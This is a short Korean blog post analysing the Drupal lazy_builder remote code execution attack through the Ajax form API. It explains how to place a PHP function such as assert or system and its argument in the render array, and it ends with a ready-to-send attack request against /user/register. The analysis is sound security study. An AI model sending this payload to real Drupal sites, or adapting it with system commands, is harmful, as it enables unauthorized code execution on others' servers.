---
layout: post
title: '[위협] Drupal_RCE(lazy_builder)'
subtitle: 'threat, drupal, rce, lazy_builder'
categories: threat
tags: application
comments: true
---

> 이 글은 어플리케이션 취약점을 분석한 글입니다. 

# Drupal_RCE(lazy_builder)

페이지의 특정 템플릿을 렌더링 할 때 쓰는 배열 형태의 Ajax API를 사용하여 원격 코드를 실행하는 공격이다.

그 중에서 lazy_builder배열은 특정 자원의 rendering 속도를 늦추는 역할을 한다. 두개의 lazy_builder배열을 사용하며,<br>
첫번째 배열에는 assert,exec,passthru,system등 수행하고 싶은 명령어를 사용<br>
두번째 배열에는 결과값이 출력되지 않으므로, 시스템 정보를 출력하는 명령어 대신 touch /tmp/file, die(md5()) 등이 적절하다.

기본적으로 해당 코드가 동작하려면, Content-Type을 application/x-www-form-urlencoded로 설정해야 한다

## 실제 공격 구문

```bash
/user/register?element_parents=timezone/timezone/#value&ajax_form=1&_wrapper_format=drupal_ajax
form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=assert&timezone[a][#lazy_builder][][]=die(md5(DIRECTORY_SEPARATOR))
```
